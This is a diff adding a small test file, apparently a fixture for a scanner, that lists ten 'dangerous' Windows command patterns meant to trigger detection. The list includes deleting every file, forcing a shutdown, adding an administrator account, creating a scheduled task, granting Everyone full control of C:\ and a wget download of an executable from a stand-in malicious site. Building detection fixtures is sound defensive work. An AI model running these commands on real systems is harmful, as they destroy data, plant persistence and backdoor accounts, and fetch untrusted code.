@@ -1,0 +1,14 @@
+This file contains dangerous patterns:
+
+1. Command execution: cmd.exe /c del *.*
+2. System shutdown: shutdown /s /t 0
+3. Registry modification: reg add HKEY_LOCAL_MACHINE
+4. Process termination: taskkill /f /im explorer.exe
+5. File download: wget http://malicious-site.com/file.exe
+6. Network commands: net user administrator /add
+7. Scheduled tasks: schtasks /create /tn "Malicious" /tr "cmd.exe"
+8. File permissions: icacls C:\ /grant Everyone:F
+9. Network scanning: netstat -an
+10. Service manipulation: net start "MaliciousService"
+
+This should trigger pattern detection.
